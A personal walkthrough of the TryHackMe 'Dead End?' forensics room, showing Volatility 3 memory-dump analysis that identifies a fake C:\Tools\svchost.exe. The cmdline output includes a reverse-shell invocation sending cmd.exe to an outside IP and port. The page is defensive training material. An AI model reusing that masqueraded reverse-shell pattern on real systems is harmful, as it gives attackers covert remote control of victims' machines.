<h1 align="center">Dead End?</h1>
<p align="center">2026, January 6 - 7&nbsp; .  &nbsp; Hey! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>! Let´s learn together. Access this walkthrough room <a href="https://tryhackme.com/room/deadend">here</a>.<br><br><img width="1200px" src="https://github.com/user-attachments/assets/eb2644f2-3c48-4f79-b8bf-f36d1b9c3b07"></p>

<h2>Task 1 . Memory</h2>

<p>An in-depth analysis of specific endpoints is reserved for those you're certain to have been compromised. It is usually done to understand how specific adversary tools or malwares work on the endpoint level; the lessons learned here are applied to the rest of the incident. <br>

You're presented with two main artefacts: a memory dump and a disk image. Can you follow the artefact trail and find the flag?</p>

<p><em>Answer the questions below</em></p>

<p>1.1. <em>What binary gives the most apparent sign of suspicious activity in the given memory image? Use the full path of the artefact.</em>Hint: It's a well known binary<br>
<code>C:\Tools\svchost.exe</code></p>

<p>

- navigate to <strong>DEadEnd_Mem 0.1</strong> VM<br>
- note that <strong>memdump.mem</strong> is in /home/ubuntu/Desktop/RobertMemdump<p>

<h6 align="center"><img width="1200px" src="https://github.com/user-attachments/assets/816f502e-563f-46ad-8d0b-41f9fecaa94c"><br><br>
                   <img width="1200px" src="https://github.com/user-attachments/assets/30a366f7-b0e6-443d-b030-62f0080a9c40"></br>Rosana´s hands-on</h6>
<p>

- execute <strong>volatility</strong> using the plugin <code>windows.info</code> to get a high-level overview of the memory image's context</p>

```bash
ubuntu@tryhackme:~/Desktop/volatility3$ python3 vol.py -f /home/ubuntu/Desktop/RobertMemdump/memdump.mem windows.info
Volatility 3 Framework 2.7.0
Progress:  100.00		PDB scanning finished                        
Variable	Value

Kernel Base	0xf802388a7000
DTB	0x1aa000
Symbols	file:///home/ubuntu/Desktop/volatility3/volatility3/symbols/windows/ntkrnlmp.pdb/94E2AE6323B686F1F4B25BA580582E04-1.json.xz
Is64Bit	True
IsPAE	False
layer_name	0 WindowsIntel32e
memory_layer	1 FileLayer
KdVersionBlock	0xf80238ca4f08
Major/Minor	15.17763
MachineType	34404
KeNumberProcessors	2
SystemTime	2024-05-14 22:07:36
NtSystemRoot	C:\Windows
NtProductType	NtProductServer
NtMajorVersion	10
NtMinorVersion	0
PE MajorOperatingSystemVersion	10
PE MinorOperatingSystemVersion	0
PE Machine	34404
PE TimeDateStamp	Sat May  4 18:48:48 2030
```

<img width="1866" height="456" alt="image" src="https://github.com/user-attachments/assets/d5c7b42c-3053-4686-8b36-84ae15761fae" />

<br>
<br>
<br>

```bash
ubuntu@tryhackme:~/Desktop/volatility3$ python3 vol.py -f /home/ubuntu/Desktop/RobertMemdump/memdump.mem windows.cmdline           
Volatility 3 Framework 2.7.0
Progress:  100.00		PDB scanning finished                        
PID	Process	Args

4	System	Required memory at 0x20 is not valid (process exited?)
88	Registry	Required memory at 0x20 is not valid (process exited?)
412	smss.exe	\SystemRoot\System32\smss.exe
580	csrss.exe	%SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16
664	csrss.exe	%SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16
684	wininit.exe	wininit.exe
752	winlogon.exe	winlogon.exe
804	services.exe	C:\Windows\system32\services.exe
824	lsass.exe	C:\Windows\system32\lsass.exe
928	svchost.exe	C:\Windows\system32\svchost.exe -k DcomLaunch -p -s PlugPlay
948	svchost.exe	C:\Windows\system32\svchost.exe -k DcomLaunch -p
968	fontdrvhost.ex	"fontdrvhost.exe"
972	fontdrvhost.ex	"fontdrvhost.exe"
512	svchost.exe	C:\Windows\system32\svchost.exe -k RPCSS -p
652	svchost.exe	C:\Windows\system32\svchost.exe -k DcomLaunch -p -s LSM
1044	svchost.exe	C:\Windows\System32\svchost.exe -k termsvcs -s TermService
1108	svchost.exe	C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p -s NcbService
1132	dwm.exe	"dwm.exe"
1240	svchost.exe	C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p -s TimeBrokerSvc
1248	svchost.exe	C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p -s EventLog
1260	svchost.exe	C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p -s lmhosts
1404	svchost.exe	C:\Windows\system32\svchost.exe -k netsvcs -p -s ProfSvc
1412	svchost.exe	C:\Windows\System32\svchost.exe -k netsvcs -p -s Themes
1420	svchost.exe	C:\Windows\system32\svchost.exe -k netsvcs -p -s gpsvc
1428	svchost.exe	C:\Windows\system32\svchost.exe -k LocalService -p -s EventSystem
1504	WUDFHost.exe	"C:\Windows\System32\WUDFHost.exe" -HostGUID:{193a1820-d9ac-4997-8c55-be817523f6aa} -IoEventPortName:\UMDFCommunicationPorts\WUDF\HostProcess-c8bd9e55-024e-4df2-a655-982af01d1f4e -SystemEventPortName:\UMDFCommunicationPorts\WUDF\HostProcess-6090299b-895d-4b2a-a974-6b1f22a9e744 -IoCancelEventPortName:\UMDFCommunicationPorts\WUDF\HostProcess-45d51d8b-2976-4ed0-8df3-7f08c803e48a -NonStateChangingEventPortName:\UMDFCommunicationPorts\WUDF\HostProcess-11296637-d2d8-46d7-84a8-ef47547c47a9 -LifetimeId:ff4536f3-d1d8-4a36-b637-7f28014ef418 -DeviceGroupId:WpdFsGroup -HostArg:0
1520	svchost.exe	C:\Windows\system32\svchost.exe -k LocalService -p -s nsi
1528	svchost.exe	C:\Windows\system32\svchost.exe -k netsvcs -p -s SENS
1588	svchost.exe	C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p -s Dhcp
1628	svchost.exe	C:\Windows\system32\svchost.exe -k NetworkService -p -s Dnscache
1636	svchost.exe	C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p
1704	svchost.exe	C:\Windows\System32\svchost.exe -k netsvcs -p -s ShellHWDetection
1712	svchost.exe	C:\Windows\System32\svchost.exe -k NetworkService -p -s NlaSvc
1740	svchost.exe	C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule
1816	svchost.exe	C:\Windows\system32\svchost.exe -k LocalService -p -s FontCache
1880	svchost.exe	C:\Windows\system32\svchost.exe -k LocalServiceNoNetworkFirewall -p
1952	svchost.exe	C:\Windows\System32\svchost.exe -k LocalService -p -s netprofm
2020	svchost.exe	C:\Windows\system32\svchost.exe -k LocalServiceNoNetwork -p
700	svchost.exe	C:\Windows\System32\svchost.exe -k NetworkService -p -s LanmanWorkstation
2212	svchost.exe	C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p -s UmRdpService
2332	svchost.exe	C:\Windows\system32\svchost.exe -k netsvcs -s CertPropSvc
2364	svchost.exe	C:\Windows\system32\svchost.exe -k netsvcs -p -s UserManager
2452	spoolsv.exe	C:\Windows\System32\spoolsv.exe
2460	svchost.exe	C:\Windows\System32\svchost.exe -k netsvcs -p -s SessionEnv
2512	svchost.exe	C:\Windows\system32\svchost.exe -k NetworkService -p -s CryptSvc
2520	svchost.exe	C:\Windows\system32\svchost.exe -k netsvcs -p -s Winmgmt
2560	svchost.exe	C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p -s SysMain
2612	svchost.exe	C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p -s TrkWks
2628	svchost.exe	C:\Windows\system32\svchost.exe -k LocalService -s W32Time
2676	svchost.exe	C:\Windows\System32\svchost.exe -k NetworkService -p -s WinRM
2696	svchost.exe	C:\Windows\system32\svchost.exe -k netsvcs -p -s WpnService
2748	LiteAgent.exe	"C:\Program Files\Amazon\XenTools\LiteAgent.exe"
2904	MsMpEng.exe	"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24030.9-0\MsMpEng.exe"
2980	svchost.exe	C:\Windows\System32\svchost.exe -k NetSvcs -p -s iphlpsvc
2992	svchost.exe	C:\Windows\System32\svchost.exe -k smbsvcs -s LanmanServer
3572	LogonUI.exe	"LogonUI.exe" /flags:0x2 /state0:0xa3a78055 /state1:0x41c64e6d
3784	csrss.exe	%SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16
3880	winlogon.exe	winlogon.exe
3980	dwm.exe	"dwm.exe"
3984	fontdrvhost.ex	"fontdrvhost.exe"
2244	NisSrv.exe	"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24030.9-0\NisSrv.exe"
4104	svchost.exe	C:\Windows\system32\svchost.exe -k appmodel -p -s StateRepository
4184	rdpclip.exe	rdpclip
4216	svchost.exe	C:\Windows\system32\svchost.exe -k UnistackSvcGroup -s CDPUserSvc
4236	svchost.exe	C:\Windows\system32\svchost.exe -k UnistackSvcGroup -s WpnUserService
4252	sihost.exe	sihost.exe
4272	taskhostw.exe	taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E}
4444	svchost.exe	C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p -s TabletInputService
4488	svchost.exe	C:\Windows\system32\svchost.exe -k netsvcs -p -s TokenBroker
4496	ctfmon.exe	"ctfmon.exe"
4780	svchost.exe	C:\Windows\system32\svchost.exe -k LocalService -p -s CDPSvc
4868	userinit.exe	Required memory at 0x54d7a5a020 is not valid (process exited?)
4904	explorer.exe	C:\Windows\Explorer.EXE
5068	amazon-ssm-age	"C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe"
3536	ShellExperienc	"C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe" -ServerName:App.AppXtk181tbxbce2qsex02s8tw7hfxa9xb3t.mca
996	ssm-agent-work	"C:\Program Files\Amazon\SSM\ssm-agent-worker.exe"
4592	conhost.exe	\??\C:\Windows\system32\conhost.exe 0x4
2620	SearchUI.exe	"C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy\SearchUI.exe" -ServerName:CortanaUI.AppXa50dqqa5gqv4a428c9y1jjw7m3btvepj.mca
2580	RuntimeBroker.	C:\Windows\System32\RuntimeBroker.exe -Embedding
5196	RuntimeBroker.	C:\Windows\System32\RuntimeBroker.exe -Embedding
5520	RuntimeBroker.	C:\Windows\System32\RuntimeBroker.exe -Embedding
6048	smartscreen.ex	C:\Windows\System32\smartscreen.exe -Embedding
816	wlrmdr.exe	Required memory at 0xb156c5f020 is not valid (process exited?)
936	csrss.exe	%SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16
5748	winlogon.exe	winlogon.exe
5356	fontdrvhost.ex	"fontdrvhost.exe"
1184	dwm.exe	"dwm.exe"
2264	rdpclip.exe	rdpclip
2340	sihost.exe	sihost.exe
2396	svchost.exe	C:\Windows\system32\svchost.exe -k UnistackSvcGroup -s CDPUserSvc
2476	svchost.exe	C:\Windows\system32\svchost.exe -k UnistackSvcGroup -s WpnUserService
5772	taskhostw.exe	taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E}
5844	userinit.exe	Required memory at 0xe518672020 is not valid (process exited?)
5660	explorer.exe	C:\Windows\Explorer.EXE
2228	smartscreen.ex	C:\Windows\System32\smartscreen.exe -Embedding
4928	ShellExperienc	"C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe" -ServerName:App.AppXtk181tbxbce2qsex02s8tw7hfxa9xb3t.mca
1600	SearchUI.exe	"C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy\SearchUI.exe" -ServerName:CortanaUI.AppXa50dqqa5gqv4a428c9y1jjw7m3btvepj.mca
1440	ctfmon.exe	"ctfmon.exe"
5864	RuntimeBroker.	C:\Windows\System32\RuntimeBroker.exe -Embedding
4224	RuntimeBroker.	C:\Windows\System32\RuntimeBroker.exe -Embedding
3412	svchost.exe	C:\Windows\System32\svchost.exe -k LocalService -p -s LicenseManager
1960	svchost.exe	C:\Windows\System32\svchost.exe -k LocalServiceNoNetwork -p -s DPS
5484	msdtc.exe	C:\Windows\System32\msdtc.exe
6168	RuntimeBroker.	C:\Windows\System32\RuntimeBroker.exe -Embedding
6364	svchost.exe	C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p -s UALSVC
6624	svchost.exe	C:\Windows\system32\svchost.exe -k netsvcs -p -s UsoSvc
6988	msedge.exe	Required memory at 0xcfd1155020 is not valid (process exited?)
6996	svchost.exe	C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p -s PcaSvc
3076	SecurityHealth	C:\Windows\system32\SecurityHealthService.exe
3116	dllhost.exe	C:\Windows\system32\DllHost.exe /Processid:{973D20D7-562D-44B9-B70B-5A0F49CCDF3F}
6768	dllhost.exe	C:\Windows\system32\DllHost.exe /Processid:{973D20D7-562D-44B9-B70B-5A0F49CCDF3F}
3824	svchost.exe	C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p -s StorSvc
4760	svchost.exe	C:\Windows\system32\svchost.exe -k netsvcs -p -s Appinfo
5396	svchost.exe	C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p -s WdiSystemHost
4608	msedge.exe	Required memory at 0xe4ce760020 is not valid (process exited?)
4796	svchost.exe	C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p -s WinHttpAutoProxySvc
1036	powershell.exe	Required memory at 0x4650be5020 is not valid (process exited?)
2736	conhost.exe	\??\C:\Windows\system32\conhost.exe 0x4
5228	svchost.exe	"C:\Tools\svchost.exe" -e cmd.exe 10.14.74.53 6996 
3580	notepad.exe	"C:\Windows\system32\NOTEPAD.EXE" C:\Users\Bobby\Documents\tmp\part2.txt
3120	cmd.exe	cmd.exe
5676	FTK Imager.exe	"C:\Program Files\AccessData\FTK Imager\FTK Imager.exe" 
```

<img width="1781" height="812" alt="image" src="https://github.com/user-attachments/assets/ec9da49d-36e6-46b3-904a-b2587c063606" />

<img width="1782" height="829" alt="image" src="https://github.com/user-attachments/assets/3c10292d-2297-4028-91d8-8b88f8d1e9b0" />

<img width="1779" height="709" alt="image" src="https://github.com/user-attachments/assets/f1513069-cee7-4826-af42-c271e01ca0d0" />




```bash
ubuntu@tryhackme:~/Desktop/volatility3$ python3 vol.py -f /home/ubuntu/Desktop/RobertMemdump/memdump.mem windows.pslist
Volatility 3 Framework 2.7.0
Progress:  100.00		PDB scanning finished                        
PID	PPID	ImageFileName	Offset(V)	Threads	Handles	SessionId	Wow64	CreateTime	ExitTime	File output

4	0	System	0xd28d65c6e200	147	-	N/A	False	2024-05-14 20:54:04.000000 	N/A	Disabled
88	4	Registry	0xd28d65de4040	4	-	N/A	False	2024-05-14 20:53:52.000000 	N/A	Disabled
412	4	smss.exe	0xd28d662ab040	2	-	N/A	False	2024-05-14 20:54:04.000000 	N/A	Disabled
580	572	csrss.exe	0xd28d6699f140	10	-	0	False	2024-05-14 20:54:16.000000 	N/A	Disabled
664	652	csrss.exe	0xd28d69030140	9	-	1	False	2024-05-14 20:54:17.000000 	N/A	Disabled
684	572	wininit.exe	0xd28d690530c0	2	-	0	False	2024-05-14 20:54:17.000000 	N/A	Disabled
752	652	winlogon.exe	0xd28d6906c080	3	-	1	False	2024-05-14 20:54:17.000000 	N/A	Disabled
804	684	services.exe	0xd28d69086100	6	-	0	False	2024-05-14 20:54:18.000000 	N/A	Disabled
824	684	lsass.exe	0xd28d66711140	7	-	0	False	2024-05-14 20:54:19.000000 	N/A	Disabled
928	804	svchost.exe	0xd28d66908080	1	-	0	False	2024-05-14 20:54:21.000000 	N/A	Disabled
948	804	svchost.exe	0xd28d69114080	15	-	0	False	2024-05-14 20:54:21.000000 	N/A	Disabled
968	752	fontdrvhost.ex	0xd28d6910a080	5	-	1	False	2024-05-14 20:54:21.000000 	N/A	Disabled
972	684	fontdrvhost.ex	0xd28d69109080	5	-	0	False	2024-05-14 20:54:21.000000 	N/A	Disabled
512	804	svchost.exe	0xd28d6910b080	11	-	0	False	2024-05-14 20:54:22.000000 	N/A	Disabled
652	804	svchost.exe	0xd28d691a9080	9	-	0	False	2024-05-14 20:54:22.000000 	N/A	Disabled
1044	804	svchost.exe	0xd28d69826080	38	-	0	False	2024-05-14 20:54:23.000000 	N/A	Disabled
1108	804	svchost.exe	0xd28d69818080	2	-	0	False	2024-05-14 20:54:23.000000 	N/A	Disabled
1132	752	dwm.exe	0xd28d69863080	12	-	1	False	2024-05-14 20:54:23.000000 	N/A	Disabled
1240	804	svchost.exe	0xd28d698550c0	2	-	0	False	2024-05-14 20:54:23.000000 	N/A	Disabled
1248	804	svchost.exe	0xd28d69897080	8	-	0	False	2024-05-14 20:54:23.000000 	N/A	Disabled
1260	804	svchost.exe	0xd28d69894080	3	-	0	False	2024-05-14 20:54:23.000000 	N/A	Disabled
1404	804	svchost.exe	0xd28d698db080	2	-	0	False	2024-05-14 20:54:23.000000 	N/A	Disabled
1412	804	svchost.exe	0xd28d698d8080	4	-	0	False	2024-05-14 20:54:23.000000 	N/A	Disabled
1420	804	svchost.exe	0xd28d698d9080	4	-	0	False	2024-05-14 20:54:23.000000 	N/A	Disabled
1428	804	svchost.exe	0xd28d698d5080	7	-	0	False	2024-05-14 20:54:23.000000 	N/A	Disabled
1504	804	WUDFHost.exe	0xd28d6995f0c0	8	-	0	False	2024-05-14 20:54:23.000000 	N/A	Disabled
1520	804	svchost.exe	0xd28d69927080	4	-	0	False	2024-05-14 20:54:23.000000 	N/A	Disabled
1528	804	svchost.exe	0xd28d69925080	6	-	0	False	2024-05-14 20:54:23.000000 	N/A	Disabled
1588	804	svchost.exe	0xd28d699a7080	7	-	0	False	2024-05-14 20:54:23.000000 	N/A	Disabled
1628	804	svchost.exe	0xd28d69979080	9	-	0	False	2024-05-14 20:54:24.000000 	N/A	Disabled
1636	804	svchost.exe	0xd28d69977080	6	-	0	False	2024-05-14 20:54:24.000000 	N/A	Disabled
1704	804	svchost.exe	0xd28d699d6080	5	-	0	False	2024-05-14 20:54:24.000000 	N/A	Disabled
1712	804	svchost.exe	0xd28d699c8080	5	-	0	False	2024-05-14 20:54:24.000000 	N/A	Disabled
1740	804	svchost.exe	0xd28d699c2080	12	-	0	False	2024-05-14 20:54:24.000000 	N/A	Disabled
1816	804	svchost.exe	0xd28d69a9b080	8	-	0	False	2024-05-14 20:54:24.000000 	N/A	Disabled
1880	804	svchost.exe	0xd28d69ad4080	12	-	0	False	2024-05-14 20:54:24.000000 	N/A	Disabled
1952	804	svchost.exe	0xd28d699bc280	9	-	0	False	2024-05-14 20:54:24.000000 	N/A	Disabled
2020	804	svchost.exe	0xd28d69b36080	2	-	0	False	2024-05-14 20:54:24.000000 	N/A	Disabled
1700	804	svchost.exe	0xd28d69ad8080	5	-	0	False	2024-05-14 20:54:24.000000 	N/A	Disabled
2212	804	svchost.exe	0xd28d69ba1080	5	-	0	False	2024-05-14 20:54:24.000000 	N/A	Disabled
2332	804	svchost.exe	0xd28d69c43080	9	-	0	False	2024-05-14 20:54:24.000000 	N/A	Disabled
2364	804	svchost.exe	0xd28d69c61080	8	-	0	False	2024-05-14 20:54:24.000000 	N/A	Disabled
2452	804	spoolsv.exe	0xd28d69c9c080	11	-	0	False	2024-05-14 20:54:24.000000 	N/A	Disabled
2460	804	svchost.exe	0xd28d69b9c080	5	-	0	False	2024-05-14 20:54:24.000000 	N/A	Disabled
2512	804	svchost.exe	0xd28d690ca080	8	-	0	False	2024-05-14 20:54:25.000000 	N/A	Disabled
2520	804	svchost.exe	0xd28d69c8b080	10	-	0	False	2024-05-14 20:54:25.000000 	N/A	Disabled
2560	804	svchost.exe	0xd28d69cd8080	2	-	0	False	2024-05-14 20:54:25.000000 	N/A	Disabled
2612	804	svchost.exe	0xd28d69ca1080	3	-	0	False	2024-05-14 20:54:25.000000 	N/A	Disabled
2628	804	svchost.exe	0xd28d66934080	4	-	0	False	2024-05-14 20:54:25.000000 	N/A	Disabled
2676	804	svchost.exe	0xd28d69cf2080	5	-	0	False	2024-05-14 20:54:25.000000 	N/A	Disabled
2696	804	svchost.exe	0xd28d69ced080	3	-	0	False	2024-05-14 20:54:25.000000 	N/A	Disabled
2748	804	LiteAgent.exe	0xd28d69db0080	2	-	0	False	2024-05-14 20:54:25.000000 	N/A	Disabled
2904	804	MsMpEng.exe	0xd28d69d8a080	27	-	0	False	2024-05-14 20:54:25.000000 	N/A	Disabled
2980	804	svchost.exe	0xd28d69e50080	7	-	0	False	2024-05-14 20:54:25.000000 	N/A	Disabled
2992	804	svchost.exe	0xd28d69e4e080	6	-	0	False	2024-05-14 20:54:25.000000 	N/A	Disabled
3572	752	LogonUI.exe	0xd28d69864080	10	-	1	False	2024-05-14 20:54:29.000000 	N/A	Disabled
3784	3816	csrss.exe	0xd28d65d19080	11	-	2	False	2024-05-14 20:54:41.000000 	N/A	Disabled
3880	3816	winlogon.exe	0xd28d6a050080	6	-	2	False	2024-05-14 20:54:41.000000 	N/A	Disabled
3980	3880	dwm.exe	0xd28d6a192080	14	-	2	False	2024-05-14 20:54:42.000000 	N/A	Disabled
3984	3880	fontdrvhost.ex	0xd28d6a346080	5	-	2	False	2024-05-14 20:54:42.000000 	N/A	Disabled
2244	804	NisSrv.exe	0xd28d6a3d6080	8	-	0	False	2024-05-14 20:54:45.000000 	N/A	Disabled
4104	804	svchost.exe	0xd28d6aa84080	7	-	0	False	2024-05-14 20:54:48.000000 	N/A	Disabled
4184	1044	rdpclip.exe	0xd28d6aa69080	11	-	2	False	2024-05-14 20:54:49.000000 	N/A	Disabled
4216	804	svchost.exe	0xd28d6aa68080	3	-	2	False	2024-05-14 20:54:49.000000 	N/A	Disabled
4236	804	svchost.exe	0xd28d6a26b080	6	-	2	False	2024-05-14 20:54:49.000000 	N/A	Disabled
4252	2364	sihost.exe	0xd28d6ab1b080	12	-	2	False	2024-05-14 20:54:49.000000 	N/A	Disabled
4272	1740	taskhostw.exe	0xd28d6ab16080	6	-	2	False	2024-05-14 20:54:49.000000 	N/A	Disabled
4444	804	svchost.exe	0xd28d6aaee080	5	-	0	False	2024-05-14 20:54:50.000000 	N/A	Disabled
4488	804	svchost.exe	0xd28d6ab0b080	3	-	0	False	2024-05-14 20:54:50.000000 	N/A	Disabled
4496	4444	ctfmon.exe	0xd28d6ab07080	8	-	2	False	2024-05-14 20:54:50.000000 	N/A	Disabled
4780	804	svchost.exe	0xd28d6aade080	3	-	0	False	2024-05-14 20:54:51.000000 	N/A	Disabled
4868	3880	userinit.exe	0xd28d691060c0	0	-	2	False	2024-05-14 20:54:52.000000 	2024-05-14 20:55:21.000000 	Disabled
4904	4868	explorer.exe	0xd28d6ac49080	50	-	2	False	2024-05-14 20:54:52.000000 	N/A	Disabled
5068	804	amazon-ssm-age	0xd28d69cda080	12	-	0	False	2024-05-14 20:54:58.000000 	N/A	Disabled
3536	948	ShellExperienc	0xd28d6aa90080	18	-	2	False	2024-05-14 20:55:01.000000 	N/A	Disabled
996	5068	ssm-agent-work	0xd28d6ac39080	13	-	0	False	2024-05-14 20:55:02.000000 	N/A	Disabled
4592	996	conhost.exe	0xd28d6ac35080	4	-	0	False	2024-05-14 20:55:02.000000 	N/A	Disabled
2620	948	SearchUI.exe	0xd28d6ad5b080	29	-	2	False	2024-05-14 20:55:03.000000 	N/A	Disabled
2580	948	RuntimeBroker.	0xd28d6ad48080	6	-	2	False	2024-05-14 20:55:04.000000 	N/A	Disabled
5196	948	RuntimeBroker.	0xd28d6ae020c0	6	-	2	False	2024-05-14 20:55:06.000000 	N/A	Disabled
5520	948	RuntimeBroker.	0xd28d6ae1a080	2	-	2	False	2024-05-14 20:55:12.000000 	N/A	Disabled
6048	948	smartscreen.ex	0xd28d6ad650c0	7	-	2	False	2024-05-14 20:55:18.000000 	N/A	Disabled
816	3880	wlrmdr.exe	0xd28d6ad51080	0	-	2	False	2024-05-14 20:55:22.000000 	2024-05-14 20:55:29.000000 	Disabled
936	3996	csrss.exe	0xd28d699df080	11	-	3	False	2024-05-14 20:56:15.000000 	N/A	Disabled
5748	3996	winlogon.exe	0xd28d69967080	5	-	3	False	2024-05-14 20:56:15.000000 	N/A	Disabled
5356	5748	fontdrvhost.ex	0xd28d698df080	5	-	3	False	2024-05-14 20:56:16.000000 	N/A	Disabled
1184	5748	dwm.exe	0xd28d69821080	14	-	3	False	2024-05-14 20:56:16.000000 	N/A	Disabled
2264	1044	rdpclip.exe	0xd28d6aa67080	11	-	3	False	2024-05-14 20:56:17.000000 	N/A	Disabled
2340	2364	sihost.exe	0xd28d6910c080	7	-	3	False	2024-05-14 20:56:17.000000 	N/A	Disabled
2396	804	svchost.exe	0xd28d69155080	4	-	3	False	2024-05-14 20:56:17.000000 	N/A	Disabled
2476	804	svchost.exe	0xd28d699de080	3	-	3	False	2024-05-14 20:56:17.000000 	N/A	Disabled
5772	1740	taskhostw.exe	0xd28d69820080	6	-	3	False	2024-05-14 20:56:17.000000 	N/A	Disabled
5844	5748	userinit.exe	0xd28d6aa650c0	0	-	3	False	2024-05-14 20:56:17.000000 	2024-05-14 20:56:41.000000 	Disabled
5660	5844	explorer.exe	0xd28d6afb0080	54	-	3	False	2024-05-14 20:56:17.000000 	N/A	Disabled
2228	948	smartscreen.ex	0xd28d69ceb080	7	-	3	False	2024-05-14 20:56:18.000000 	N/A	Disabled
4928	948	ShellExperienc	0xd28d6ab1d080	25	-	3	False	2024-05-14 20:56:20.000000 	N/A	Disabled
1600	948	SearchUI.exe	0xd28d6ae1f080	31	-	3	False	2024-05-14 20:56:21.000000 	N/A	Disabled
1440	4444	ctfmon.exe	0xd28d6b968080	8	-	3	False	2024-05-14 20:56:21.000000 	N/A	Disabled
5864	948	RuntimeBroker.	0xd28d6b88b080	3	-	3	False	2024-05-14 20:56:21.000000 	N/A	Disabled
4224	948	RuntimeBroker.	0xd28d6ba11080	2	-	3	False	2024-05-14 20:56:21.000000 	N/A	Disabled
3412	804	svchost.exe	0xd28d6ba1c080	3	-	0	False	2024-05-14 20:56:22.000000 	N/A	Disabled
1960	804	svchost.exe	0xd28d6b971080	19	-	0	False	2024-05-14 20:56:26.000000 	N/A	Disabled
5484	804	msdtc.exe	0xd28d69cee080	9	-	0	False	2024-05-14 20:56:27.000000 	N/A	Disabled
6168	948	RuntimeBroker.	0xd28d6bac3080	1	-	3	False	2024-05-14 20:56:27.000000 	N/A	Disabled
6364	804	svchost.exe	0xd28d6bb5b080	9	-	0	False	2024-05-14 20:56:29.000000 	N/A	Disabled
6624	804	svchost.exe	0xd28d6bc52080	6	-	0	False	2024-05-14 20:56:32.000000 	N/A	Disabled
6988	5660	msedge.exe	0xd28d6b1a0080	0	-	3	False	2024-05-14 20:56:58.000000 	2024-05-14 21:04:09.000000 	Disabled
6996	804	svchost.exe	0xd28d6bbc1080	10	-	0	False	2024-05-14 20:56:58.000000 	N/A	Disabled
3076	804	SecurityHealth	0xd28d6ae16080	8	-	0	False	2024-05-14 21:00:39.000000 	N/A	Disabled
3116	948	dllhost.exe	0xd28d6bbdb740	5	-	3	False	2024-05-14 21:01:18.000000 	N/A	Disabled
6768	948	dllhost.exe	0xd28d65d22080	5	-	2	False	2024-05-14 21:01:33.000000 	N/A	Disabled
3824	804	svchost.exe	0xd28d6aee4080	3	-	0	False	2024-05-14 21:05:05.000000 	N/A	Disabled
4760	804	svchost.exe	0xd28d6ac3d080	1	-	0	False	2024-05-14 21:06:12.000000 	N/A	Disabled
5396	804	svchost.exe	0xd28d6ba18080	3	-	0	False	2024-05-14 21:11:29.000000 	N/A	Disabled
4608	4904	msedge.exe	0xd28d6afcd080	0	-	2	False	2024-05-14 21:15:37.000000 	2024-05-14 21:21:07.000000 	Disabled
4796	804	svchost.exe	0xd28d6906e080	5	-	0	False	2024-05-14 22:05:52.000000 	N/A	Disabled
1036	5660	powershell.exe	0xd28d6a3d3080	0	-	3	False	2024-05-14 22:06:21.000000 	2024-05-14 22:06:22.000000 	Disabled
2736	1036	conhost.exe	0xd28d6a19d080	3	-	3	False	2024-05-14 22:06:21.000000 	N/A	Disabled
5228	1036	svchost.exe	0xd28d6ad4e080	3	-	3	False	2024-05-14 22:06:22.000000 	N/A	Disabled
3580	1036	notepad.exe	0xd28d6bc4a080	4	-	3	False	2024-05-14 22:06:22.000000 	N/A	Disabled
3120	5228	cmd.exe	0xd28d6b96b080	1	-	3	False	2024-05-14 22:06:22.000000 	N/A	Disabled
5676	4904	FTK Imager.exe	0xd28d69af8080	20	-	2	False	2024-05-14 22:07:19.000000 	N/A	Disabled
```

<img width="1869" height="710" alt="image" src="https://github.com/user-attachments/assets/ec26d747-1a30-4223-b100-9b99a1628993" />

<img width="1863" height="831" alt="image" src="https://github.com/user-attachments/assets/3a69912d-a1c9-47d2-a4b0-8c4e3bef3ba2" />

<br>
<br>
<br>

```bash
ubuntu@tryhackme:~/Desktop/volatility3$ python3 vol.py -f /home/ubuntu/Desktop/RobertMemdump/memdump.mem windows.pstree | grep 1036
*** 1036	5660	powershell.exe	0xd28d6a3d3080	0	-	3	False	2024-05-14 22:06:21.000000 	2024-05-14 22:06:22.000000 	\Device\HarddiskVolume1\Windows\System32\WindowsPowerShell\v1.0\powershell.exe	-	-
